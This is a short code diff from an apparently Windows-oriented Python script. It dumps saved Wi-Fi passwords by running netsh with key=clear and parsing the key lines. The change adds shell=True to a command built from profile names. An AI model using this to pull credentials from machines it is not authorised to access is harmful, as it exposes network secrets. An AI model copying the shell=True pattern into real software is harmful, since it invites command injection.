@@ -34,7 +34,7 @@ while True:
         print(f'|\n| [! INIT] Profile: {profile}')
         # try execute code
         try:
-            password_raw = subprocess.check_output(["netsh", "wlan", "show", "profile", f'name="{profile}"', "key=clear"], encoding="cp858")
+            password_raw = subprocess.check_output(["netsh", "wlan", "show", "profile", f'name="{profile}"', "key=clear"], shell=True, encoding="cp858")
             for line in password_raw.split("\n"):
                 if "Key Content            :" in line:
                     passwords[f"profile{count}"] = {
